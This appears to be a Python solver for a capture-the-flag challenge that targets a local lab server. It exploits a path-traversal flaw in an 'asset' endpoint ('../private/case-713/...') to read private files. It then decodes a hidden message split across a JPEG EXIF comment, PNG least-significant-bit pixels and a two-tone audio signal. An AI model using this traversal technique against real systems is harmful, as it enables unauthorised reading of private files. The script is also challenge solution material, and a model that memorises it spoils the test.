#!/usr/bin/env python3
import math
import re
import struct
import sys
import wave
import zlib
from io import BytesIO
from urllib.parse import urlencode, urljoin
from urllib.request import Request, urlopen


def fetch_bytes(url):
    request = Request(url, headers={"User-Agent": "tri-modal-solver"})
    with urlopen(request, timeout=10) as response:
        return response.read()


def fetch_text(url):
    return fetch_bytes(url).decode("utf-8", errors="replace")


def lfi_url(base_url, filename):
    query = urlencode({"name": "../private/case-713/" + filename})
    return urljoin(base_url, "asset") + "?" + query


def parse_exif_part(jpeg):
    idx = jpeg.find(b"ASCII\x00\x00\x00")
    if idx < 0:
        raise ValueError("UserComment not found")
    start = idx + len(b"ASCII\x00\x00\x00")
    end = start
    while end < len(jpeg) and 32 <= jpeg[end] < 127:
        end += 1
    return jpeg[start:end].decode("ascii")


def png_chunks(data):
    if not data.startswith(b"\x89PNG\r\n\x1a\n"):
        raise ValueError("not a PNG")
    off = 8
    while off + 12 <= len(data):
        size = int.from_bytes(data[off:off + 4], "big")
        kind = data[off + 4:off + 8]
        payload = data[off + 8:off + 8 + size]
        yield kind, payload
        off += 12 + size


def parse_lsb_part(png):
    width = height = None
    raw = b""
    for kind, payload in png_chunks(png):
        if kind == b"IHDR":
            width, height = struct.unpack(">II", payload[:8])
        elif kind == b"IDAT":
            raw += payload
    data = zlib.decompress(raw)
    bits = []
    off = 0
    for _ in range(height):
        filt = data[off]
        off += 1
        if filt != 0:
            raise ValueError("unexpected PNG filter")
        row = data[off:off + width * 3]
        off += width * 3
        for pixel in range(width):
            bits.append(str(row[pixel * 3 + 2] & 1))

    out = bytearray()
    for i in range(0, len(bits), 8):
        byte = int("".join(bits[i:i + 8]), 2)
        if byte == 0:
            break
        out.append(byte)
    return out.decode("ascii")


def goertzel(samples, rate, freq):
    coeff = 2 * math.cos(2 * math.pi * freq / rate)
    s_prev = 0.0
    s_prev2 = 0.0
    for sample in samples:
        s = sample + coeff * s_prev - s_prev2
        s_prev2 = s_prev
        s_prev = s
    return s_prev2 * s_prev2 + s_prev * s_prev - coeff * s_prev * s_prev2


def parse_audio_part(wav_data):
    with wave.open(BytesIO(wav_data), "rb") as wav:
        rate = wav.getframerate()
        frames = wav.readframes(wav.getnframes())
    samples = [struct.unpack_from("<h", frames, i)[0] / 32768.0 for i in range(0, len(frames), 2)]
    window = int(rate * 0.20)
    bits = []
    for off in range(0, len(samples), window):
        chunk = samples[off:off + window]
        if len(chunk) < window:
            continue
        # Each bit window contains a short tone followed by silence.
        tone = chunk[:int(rate * 0.14)]
        e0 = goertzel(tone, rate, 1200)
        e1 = goertzel(tone, rate, 2400)
        bits.append("1" if e1 > e0 else "0")

    out = bytearray()
    for i in range(0, len(bits), 8):
        byte = int("".join(bits[i:i + 8]), 2)
        if byte == 0:
            break
        out.append(byte)
    return out.decode("ascii")


def main():
    base_url = sys.argv[1].rstrip("/") + "/" if len(sys.argv) > 1 else "http://127.0.0.1:8083/"
    fetch_text(urljoin(base_url, "robots.txt"))
    api_index = fetch_text(urljoin(base_url, "api/"))
    if "case 713" not in api_index:
        raise SystemExit("api index did not reveal archived case id")
    manifest = fetch_text(urljoin(base_url, "api/manifest?case=713"))
    if "case-713" not in manifest:
        raise SystemExit("manifest did not reveal archived case")

    part1 = parse_exif_part(fetch_bytes(lfi_url(base_url, "photo.jpg")))
    part2 = parse_lsb_part(fetch_bytes(lfi_url(base_url, "mask.png")))
    part3 = parse_audio_part(fetch_bytes(lfi_url(base_url, "signal.wav")))
    print(part1 + part2 + part3)


if __name__ == "__main__":
    main()
